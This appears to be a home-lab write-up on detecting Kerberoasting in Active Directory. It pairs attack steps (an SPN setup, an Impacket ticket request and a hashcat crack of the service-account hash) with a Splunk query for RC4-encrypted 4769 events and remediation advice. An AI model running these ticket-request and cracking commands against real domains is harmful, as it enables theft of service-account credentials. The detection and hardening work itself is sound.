# Detection: Kerberoasting

## The attack in one sentence

Any authenticated domain user can request a service ticket for an account that has a Service Principal Name (SPN); that ticket is encrypted with the service account's password hash, which can then be cracked offline.

## Setup

A service account `svc-sql` was created with an SPN, making it a roastable target:

```
setspn -s MSSQLSvc/sql01.corp.lab:1433 corp\svc-sql
setspn -l corp\svc-sql
```

## How I ran it

Requested the ticket with Impacket (leaving the password off so the shell prompt handled the `!` in the password), then cracked offline with hashcat:

```bash
impacket-GetUserSPNs corp.lab/asnow -dc-ip 10.0.40.10 -request -outputfile kerb.txt
# type the password at the prompt

hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -w 1
```

hashcat recovered the service-account password:

```
$krb5tgs$23$...:Summer2026
```

![Kerberoasting - hashcat cracked](../screenshots/HashCat.png)

## The detection

**Event ID 4769** (service ticket requested) fires constantly during normal operation, so the signal isn't the event itself — it's the **RC4 encryption type (`0x17`)** on a request for the service account. Legitimate modern tickets use AES (`0x12`); attackers request RC4 because it's the crackable one.

```
index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17
| stats count by Account_Name, Service_Name
```

![Kerberoasting - 4769 RC4](../screenshots/KerberoastingDetected.png)

The fingerprint is `asnow` requesting an RC4-encrypted ticket for the SQL service — one malicious row isolated from all the normal 4769 noise by its encryption type.

## Remediation

- Long (25+ char), random passwords on service accounts — makes offline cracking infeasible.
- Use Group Managed Service Accounts (gMSA) where possible.
- Disable RC4 for Kerberos; force AES.
- Alert on 4769 with `Ticket_Encryption_Type=0x17`, especially for high-value SPNs.

